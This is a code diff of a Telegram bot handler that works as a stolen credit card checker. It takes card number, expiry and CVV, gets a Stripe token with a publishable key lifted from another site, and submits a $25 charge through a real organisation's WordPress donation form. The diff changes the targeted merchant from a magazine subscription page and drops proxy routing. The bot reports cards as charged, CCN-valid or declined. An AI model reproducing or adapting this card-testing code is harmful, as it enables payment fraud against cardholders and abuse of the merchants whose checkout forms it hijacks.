@@ -247,20 +247,19 @@ async def ch(message: types.Message):
             "content-type": "application/x-www-form-urlencoded"
         }
 
-        b = session.get('https://ip.seeip.org/', proxies=proxies).text
+        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
 
-        s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
+        s = session.post('https://m.stripe.com/6', headers=headers)
         r = s.json()
         Guid = r['guid']
         Muid = r['muid']
         Sid = r['sid']
 
-        # hmm
-        load = {
+        postdata = {
             "guid": Guid,
             "muid": Muid,
             "sid": Sid,
-            "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
+            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
             "card[name]": Name,
             "card[number]": ccn,
             "card[exp_month]": mm,
@@ -268,7 +267,7 @@ async def ch(message: types.Message):
             "card[cvc]": cvv
         }
 
-        header = {
+        HEADER = {
             "accept": "application/json",
             "content-type": "application/x-www-form-urlencoded",
             "user-agent": UA,
@@ -277,69 +276,61 @@ async def ch(message: types.Message):
             "accept-language": "en-US,en;q=0.9"
         }
 
-        rx = session.post('https://api.stripe.com/v1/tokens',
-                          data=load, headers=header, proxies=proxies)
-        token = rx.json()['id']
-        LastF = f'************{ccn[-4:]}'
+        pr = session.post('https://api.stripe.com/v1/tokens',
+                          data=postdata, headers=HEADER)
+        Id = pr.json()['id']
 
-        payload = {
-            "subscription_type": "digital",
-            "first_name": First,
-            "last_name": Last,
-            "email": Email,
-            "login_pass": PWD,
-            "confirm_pass": PWD,
-            "shipping_country": "United+States",
-            "card_number": LastF,
-            "card_cvc": cvv,
-            "card_expiry_month": mm,
-            "card_expiry_year": yy,
-            "action": "register",
-            "stripe_token": token,
-            "last4": token
+        # hmm
+        load = {
+            "action": "wp_full_stripe_payment_charge",
+            "formName": "BanquetPayment",
+            "fullstripe_name": Name,
+            "fullstripe_email": Email,
+            "fullstripe_custom_amount": "25.0",
+            "fullstripe_amount_index": 0,
+            "stripeToken": Id
         }
 
-        head = {
-            "accept": "*/*",
+        header = {
+            "accept": "application/json, text/javascript, */*; q=0.01",
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
             "user-agent": UA,
-            "origin": "https://preludemag.com",
-            "referer": "https://preludemag.com/subscribe/",
+            "origin": "https://archiro.org",
+            "referer": "https://archiro.org/banquet/",
             "accept-language": "en-US,en;q=0.9"
         }
 
-        ri = session.post('https://preludemag.com/subscribe/', data=payload,
-                          headers=head, proxies=proxies)
+        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
+                          data=load, headers=header)
+        msg = rx.json()['msg']
+
         toc = time.perf_counter()
 
-        if 'success' in ri.text:
+        if 'true' in rx.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #ApprovedCVV
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
+<b>STATUS</b>➟ #CHARGED 25$
+<b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
-        if 'incorrect_cvc' in ri.text:
+        if 'security code' in rx.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #ApprovedCCN
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
+<b>STATUS</b>➟ #CCN
+<b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
-        if 'declined' in ri.text:
+        if 'false' in rx.text:
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ Declined
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
+<b>STATUS</b>➟ #Declined
+<b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
@@ -348,8 +339,7 @@ async def ch(message: types.Message):
         await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {ri.text}
-<b>PROXY-IP</b> <code>{b}</code>
+<b>MSG</b>➟ {rx.text}
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
